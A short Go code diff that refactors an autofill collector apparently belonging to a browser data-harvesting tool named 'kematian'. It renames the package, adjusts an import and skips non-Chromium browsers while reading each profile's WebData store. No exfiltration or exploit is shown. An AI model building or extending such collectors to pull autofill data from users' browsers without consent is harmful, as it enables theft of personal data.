@@ -1,9 +1,9 @@
-package autofill
+package autofillChromium
 
 import (
 	"database/sql"
 	"encoding/json"
-	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/structs"
 )
 
 type Autofill struct {
@@ -18,6 +18,9 @@ type Autofill struct {
 func Get(browsersList []structs.Browser) string {
 	var autofill []Autofill
 	for _, browser := range browsersList {
+		if !browser.IsChromium {
+			continue
+		}
 		for _, profile := range browser.Profiles {
 			path := profile.WebData
 
